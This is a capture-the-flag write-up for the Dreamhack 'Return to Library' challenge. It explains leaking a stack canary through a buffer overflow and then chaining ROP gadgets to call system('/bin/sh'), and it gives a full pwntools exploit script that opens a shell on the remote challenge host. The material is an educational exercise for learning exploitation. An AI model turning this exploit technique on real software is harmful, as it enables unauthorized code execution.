# Dreamhack : Return to Library

[ Author : el1ya ]  

**1. Analysis**

To use checksec, rtl has canary and NX.  

We have to leak canary, and can not use shellcode.  

We need to leak canary.  

0x08 is size of canary.  

So we send A * 56, and to leak canary, we have to overflow null.  

So, send B together.  

Then, We can leak canary.  

We have to find ret, pop_rdi; ret, /bin/sh, and system@plt.  

Ret : To set at ease program.  

pop_rdi : To put the address of /bin/sh in rdi.  

/bin/sh : To execute shell.  

system@plt : To execute /bin/shell function  

To find Ret: [ROPgadget --binary=./rtl | grep ": ret”]  

To find pop_rdi: [ROPgadget --binary ./rtl --re "pop rdi”]  

To find /bin/sh: In pwndbg, [search /bin/sh]  

To find system@plt: In pwndbg, [plt]  

**2. Vulnerabilities**

Buf size is 0x30, but we can get over the 0x30 letters  

So, it maybe overflow the buffer.  

We can find the address of ret, pop_rdi, /bin/sh, system@plt  

**3. Exploitation**

```python  
from pwn import *  

p = remote("host8.dreamhack.games", 9918)  

payload = b"A" * 56 + b"B"  

p.send(payload)  

p.recvuntil(b"AB")  
canary_leak = p.recvn(7)  
canary = u64(b'\x00' + canary_leak)  

pop_rdi = 0x0000000000400853  
ret = 0x0000000000400596  
binsh = 0x400874  
system = 0x4005d0  

payload = b"A"*56 + p64(canary) + b"C" * 8 + p64(ret)  
payload += p64(pop_rdi) + p64(binsh) + p64(system)  

p.send(payload)  
p.interactive()  
```

**4. Result**

[▁] Opening connection to host8.dreamhack.games on port 9918: Trying 158.247[+] Opening connection to host8.dreamhack.games on port 9918: Done  
[*] **Switching to interactive mode  
\xf0\x07@  
[2] Overwrite return address  
Buf: $ cat flag  
DH{flag}  
[*] Got EOF while reading in interactive  

 

[ NOTE ]  

I had long time to understand ROP!! → To solve more questions  

Leaking canary is hard for me TT → Understand about canary more.  
